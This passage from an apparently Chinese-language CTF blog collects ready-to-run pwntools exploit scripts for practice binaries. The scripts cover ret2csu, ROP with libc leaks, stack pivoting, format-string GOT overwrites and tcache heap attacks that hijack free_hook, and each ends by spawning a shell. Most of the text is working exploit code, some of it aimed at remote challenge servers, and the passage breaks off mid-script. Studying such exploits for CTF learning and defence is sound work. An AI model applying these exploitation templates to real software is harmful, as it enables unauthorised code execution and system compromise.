class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">level5 = ELF(<span class="string">'./level5'</span>)</span><br><span class="line">sh = process(<span class="string">'./level5'</span>)</span><br><span class="line"></span><br><span class="line">write_got = level5.got[<span class="string">'write'</span>]</span><br><span class="line">read_got = level5.got[<span class="string">'read'</span>]</span><br><span class="line">main_addr = level5.symbols[<span class="string">'main'</span>]</span><br><span class="line">bss_base = level5.bss()</span><br><span class="line">csu_front_addr = <span class="number">0x0000000000400600</span></span><br><span class="line">csu_end_addr = <span class="number">0x000000000040061A</span></span><br><span class="line">fakeebp = <span class="string">'b'</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(rbx, rbp, r12, r13, r14, r15, last)</span>:</span></span><br><span class="line">    <span class="comment"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    <span class="comment"># rbx should be 0,</span></span><br><span class="line">    <span class="comment"># rbp should be 1,enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function we want to call</span></span><br><span class="line">    <span class="comment"># rdi=edi=r15d</span></span><br><span class="line">    <span class="comment"># rsi=r14</span></span><br><span class="line">    <span class="comment"># rdx=r13</span></span><br><span class="line">    payload = <span class="string">'a'</span> * <span class="number">0x80</span> + fakeebp</span><br><span class="line">    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(</span><br><span class="line">        r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">'a'</span> * <span class="number">0x38</span></span><br><span class="line">    payload += p64(last)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'Hello, World\n'</span>)</span><br><span class="line"><span class="comment">## RDI, RSI, RDX, RCX, R8, R9, more on the stack</span></span><br><span class="line"><span class="comment">## write(1,write_got,8)</span></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">8</span>, write_got, <span class="number">1</span>, main_addr)</span><br><span class="line"></span><br><span class="line">write_addr = u64(sh.recv(<span class="number">8</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>, write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">'write'</span>)</span><br><span class="line">execve_addr = libc_base + libc.dump(<span class="string">'execve'</span>)</span><br><span class="line">log.success(<span class="string">'execve_addr '</span> + hex(execve_addr))</span><br><span class="line"><span class="comment">##gdb.attach(sh)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## read(0,bss_base,16)</span></span><br><span class="line"><span class="comment">## read execve_addr and /bin/sh\x00</span></span><br><span class="line">sh.recvuntil(<span class="string">'Hello, World\n'</span>)</span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">16</span>, bss_base, <span class="number">0</span>, main_addr)</span><br><span class="line">sh.send(p64(execve_addr) + <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'Hello, World\n'</span>)</span><br><span class="line"><span class="comment">## execve(bss_base+8)</span></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, bss_base, <span class="number">0</span>, <span class="number">0</span>, bss_base + <span class="number">8</span>, main_addr)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="ROP-libc"><a href="#ROP-libc" class="headerlink" title="ROP+libc"></a>ROP+libc</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process("./ciscn_2019_c_1")</span></span><br><span class="line">p = remote(<span class="string">"node4.buuoj.cn"</span>,<span class="number">25863</span>)</span><br><span class="line">elf = ELF(<span class="string">'./ciscn_2019_c_1'</span>)</span><br><span class="line"></span><br><span class="line">padding=<span class="number">0x50</span>+<span class="number">8</span></span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">'puts'</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># ROPgadget --binary ciscn_2019_c_1 --only 'pop|ret'</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000400c83</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b'\0'</span>+<span class="string">b'a'</span>*(padding<span class="number">-1</span>)</span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(puts_got)</span><br><span class="line">payload+=p64(puts_plt)</span><br><span class="line">payload+=p64(main_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 32</span></span><br><span class="line"><span class="comment"># payload = padding*b'a'</span></span><br><span class="line"><span class="comment"># payload+=p32(write_plt)</span></span><br><span class="line"><span class="comment"># payload+=p32(main_addr)</span></span><br><span class="line"><span class="comment"># payload+=p32(1)+p32(read_got)+p32(4)</span></span><br><span class="line"><span class="comment"># p.sendline(payload)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'choice!\n'</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'encrypted\n'</span>,payload)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line"><span class="comment"># puts_addr = u32(p.recv(4)) # 32</span></span><br><span class="line">log.info(<span class="string">"puts_addr: "</span>+str(hex(puts_addr)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(hex(puts_addr))</span></span><br><span class="line"><span class="comment"># 0x7f51373336a0</span></span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">'puts'</span>,puts_addr)</span><br><span class="line">offset=puts_addr-libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">binsh=offset+libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">system=offset+libc.dump(<span class="string">'system'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'choice!\n'</span>,<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b'\0'</span>+<span class="string">b'a'</span>*(padding<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ROPgadget --binary ciscn_2019_c_1 --only 'ret'</span></span><br><span class="line">ret=<span class="number">0x4006b9</span></span><br><span class="line"></span><br><span class="line">payload+=p64(ret)</span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(binsh)</span><br><span class="line">payload+=p64(system)</span><br><span class="line"><span class="comment"># payload = offset*'a' + p32(system_addr) + p32(1) + p32(binsh_addr)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'encrypted\n'</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="stack-pvoit-栈迁移"><a href="#stack-pvoit-栈迁移" class="headerlink" title="stack pvoit 栈迁移"></a>stack pvoit 栈迁移</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">call_system=<span class="number">0x08048559</span></span><br><span class="line">leave=<span class="number">0x08048562</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">p=process(<span class="string">'./ciscn_2019_es_2'</span>)</span><br><span class="line"><span class="comment"># p=remote("node4.buuoj.cn",27454)</span></span><br><span class="line"><span class="comment"># gdb.attach(p,'b vul')</span></span><br><span class="line">payload=<span class="string">b'a'</span>*<span class="number">0x24</span>+<span class="string">b'b'</span>*<span class="number">4</span></span><br><span class="line">p.recvuntil(<span class="string">'name?\n'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">'bbbb'</span>)</span><br><span class="line">addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log.info(<span class="string">'ebp_addr: '</span>+hex(addr))</span><br><span class="line">payload1=<span class="string">b'a'</span>*<span class="number">4</span>+p32(call_system)+p32(addr<span class="number">-0x38</span>+<span class="number">0xc</span>)+<span class="string">b'/bin/sh'</span></span><br><span class="line">payload1=payload1.ljust(<span class="number">0x28</span>,<span class="string">b'\x00'</span>)+p32(addr<span class="number">-0x38</span>)+p32(leave)</span><br><span class="line">p.send(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="格式化字符串修改内存"><a href="#格式化字符串修改内存" class="headerlink" title="格式化字符串修改内存"></a>格式化字符串修改内存</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 利用格式化字符串改写atoi的got地址，将其改为system的地址，配合之后的输入，得*到shell。这种方法具有普遍性，也可以改写后面的函数的地址，拿到shell。</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./pwn'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line"></span><br><span class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># AAAA %08x %08x %8x %08x %08x %08x %08x……</span></span><br><span class="line">payload=fmtstr_payload(<span class="number">10</span>,&#123;atoi_got:system_plt&#125;)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># bss段的unk_804C044，是随机生成的，而我们猜对了这个参数，就可以执行system("/bin/sh"),刚好字符串格式化漏洞可以实现改写内存地址的值</span></span><br><span class="line"><span class="comment"># from pwn import *</span></span><br><span class="line"><span class="comment"># #context.log_level = "debug"</span></span><br><span class="line"><span class="comment"># p = remote("node3.buuoj.cn",26486)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># unk_804C044 = 0x0804C044</span></span><br><span class="line"><span class="comment"># payload=fmtstr_payload(10,&#123;unk_804C044:0x1111&#125;)</span></span><br><span class="line"><span class="comment"># p.sendlineafter("your name:",payload)</span></span><br><span class="line"><span class="comment"># p.sendlineafter("your passwd",str(0x1111))</span></span><br><span class="line"><span class="comment"># p.interactive()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接利用格式化字符串改写unk_804C044之中的数据，然后输入数据对比得到shell。</span></span><br><span class="line"><span class="comment"># from pwn import *</span></span><br><span class="line"><span class="comment"># p = process('./pwn5')</span></span><br><span class="line"><span class="comment"># addr = 0x0804C044</span></span><br><span class="line"><span class="comment"># #地址，也就相当于可打印字符串，共16byte</span></span><br><span class="line"><span class="comment"># payload = p32(addr)+p32(addr+1)+p32(addr+2)+p32(addr+3)</span></span><br><span class="line"><span class="comment"># #开始将前面输出的字符个数输入到地址之中，hhn是单字节输入，其偏移为10</span></span><br><span class="line"><span class="comment"># #%10$hhn就相当于读取栈偏移为10的地方的数据，当做地址，然后将前面的字符数写入到地址之中</span></span><br><span class="line"><span class="comment"># payload += "%10$hhn%11$hhn%12$hhn%13$hhn"</span></span><br><span class="line"><span class="comment"># p.sendline(payload)</span></span><br><span class="line"><span class="comment"># p.sendline(str(0x10101010))</span></span><br><span class="line"><span class="comment"># p.interactive()</span></span><br></pre></td></tr></table></figure>

<h2 id="栈迁移-gadget"><a href="#栈迁移-gadget" class="headerlink" title="栈迁移+gadget"></a>栈迁移+gadget</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#start</span></span><br><span class="line">p = remote(<span class="string">"node4.buuoj.cn"</span>,<span class="number">26761</span>)</span><br><span class="line"><span class="comment"># p = process('./gyctf_2020_borrowstack')</span></span><br><span class="line">elf=ELF(<span class="string">'./gyctf_2020_borrowstack'</span>)</span><br><span class="line"></span><br><span class="line">padding1=<span class="number">0x60</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000400703</span></span><br><span class="line">leave_ret=<span class="number">0x0000000000400699</span></span><br><span class="line">bank=<span class="number">0x601080</span>+<span class="number">0xa0</span></span><br><span class="line">puts_plt=elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">'puts'</span>]</span><br><span class="line">main=elf.symbols[<span class="string">'main'</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b'a'</span>*padding1</span><br><span class="line">payload+=p64(bank)+p64(leave_ret)</span><br><span class="line">p.sendafter(<span class="string">'Ｗelcome to Stack bank,Tell me what you want\n'</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p2 = p64(<span class="number">0</span>) * <span class="number">0x15</span></span><br><span class="line">p2 += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line">p.sendafter(<span class="string">'Done!You can check and use your borrow stack now!\n'</span>, p2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">'puts'</span>,puts_addr)</span><br><span class="line">offest=puts_addr-libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">read=offest+libc.dump(<span class="string">'read'</span>)</span><br><span class="line">one_gadget=read<span class="number">-0x6109</span></span><br><span class="line"></span><br><span class="line">p3 = <span class="string">b'a'</span> * (<span class="number">0x60</span> + <span class="number">8</span>) + p64(one_gadget)</span><br><span class="line">p.sendafter(<span class="string">'want\n'</span>, p3)</span><br><span class="line">p.sendafter(<span class="string">'now!\n'</span>, <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 以前从来没注意过one_gadget的调用过程，借这次比赛机会了解了一下，也学到了很多小技巧，在这里记录一下。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果是使用_malloc_hook来调用one_gadget，那么需要配合realloc来构造所需参数，realloc在libc中的符号是__libc_realloc</span></span><br><span class="line"><span class="comment"># 如果是使用其他方式调用one_gadget，比如说修改GOT表，那么需要在栈上提前构造好参数，或者将rax寄存器清零</span></span><br><span class="line"><span class="comment"># 在泄露libc地址的时候，最好是泄露read函数的地址，因为read函数距离one_gadget的偏移是不会变的，只需要将read函数真实地址减去0x6109，就可以使用one_gadget了，具体可以自行调试一下便知。那这么做的好处就是不用去知道libc的版本，省了很大一部分时间和精力，libc版本是个坑，懂的都懂。</span></span><br></pre></td></tr></table></figure>

<h1 id="Heap-Exp-Code"><a href="#Heap-Exp-Code" class="headerlink" title="Heap-Exp-Code"></a>Heap-Exp-Code</h1><h2 id="tcache-libc-2-27-off-by-null-UAF-one-gadget"><a href="#tcache-libc-2-27-off-by-null-UAF-one-gadget" class="headerlink" title="tcache + libc-2.27 + off by null + UAF + one-gadget"></a>tcache + libc-2.27 + off by null + UAF + one-gadget</h2><p>程序有个off by null漏洞点，然后libc是2.27的，所以存在tcache机制，当free 7个块tcache满了以后，第8，9，10个块就会放入unsorted bin中，利用off by null来free的时候向前合并，然后uaf泄漏libc地址，再利用tcache dup(类似double free)来对free_hook改写成one_gadget</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puts</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./easy_heap'</span>)</span><br><span class="line"><span class="comment">#p = remote('118.25.150.134',6666 )</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    malloc(<span class="number">0x20</span>,<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>,<span class="number">10</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    malloc(<span class="number">0x20</span>,<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>) <span class="comment">#fill tcache</span></span><br><span class="line">free(<span class="number">7</span>) <span class="comment">#unsorted bin</span></span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0xf8</span>,<span class="string">'b'</span>) <span class="comment">#change next_chunk pre_inuse = 0</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">6</span>) <span class="comment">#fill tcache</span></span><br><span class="line">free(<span class="number">9</span>) <span class="comment">#unsorted bin</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#unsorted bin point to chunk[0]</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    malloc(<span class="number">0x20</span>,<span class="string">'b'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">puts(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">96</span> - <span class="number">0x3ebc40</span></span><br><span class="line">log.success(<span class="string">'libc base addr : 0x%x'</span>%libc_base)</span><br><span class="line">free_hook = libc_base + <span class="number">0x3ed8e8</span></span><br><span class="line">one_gadget = libc_base + <span class="number">0x4f322</span></span><br><span class="line">log.success(<span class="string">'free_hook addr : 0x%x'</span>%free_hook)</span><br><span class="line">log.success(<span class="string">'one_gadget addr : 0x%x'</span>%one_gadget)</span><br><span class="line"></span><br><span class="line"><span class="comment">#clear unsorted bin</span></span><br><span class="line">malloc(<span class="number">0x20</span>,<span class="string">'d'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#free place to malloc</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#tcache dup</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#hijack free_hook to one_gadegt</span></span><br><span class="line">malloc(<span class="number">0x20</span>,p64(free_hook))</span><br><span class="line">malloc(<span class="number">0x20</span>,<span class="string">'e'</span>)</span><br><span class="line">malloc(<span class="number">0x20</span>,p64(one_gadget))</span><br><span class="line"></span><br><span class="line"><span class="comment">#trigger one_gadget to getshelol</span></span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="tcache-libc-2-27-off-by-null-UAF-one-gadget-任意大小的堆块"><a href="#tcache-libc-2-27-off-by-null-UAF-one-gadget-任意大小的堆块" class="headerlink" title="tcache + libc-2.27 + off by null + UAF + one-gadget + 任意大小的堆块"></a>tcache + libc-2.27 + off by null + UAF + one-gadget + 任意大小的堆块</h2><p>漏洞点也是off by null，libc也是2.27的，跟easy_heap差不多，但是这里可以分配任意大小的堆块，tcache的范围是 [0x20, 0x400)，超过这个大小的就会放入unsorted bin，利用off by null来free chunk的时候向前合并，然后uaf泄漏libc地址，再利用tcache dup(类似double free)来对free_hook改写成one_gadget</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span 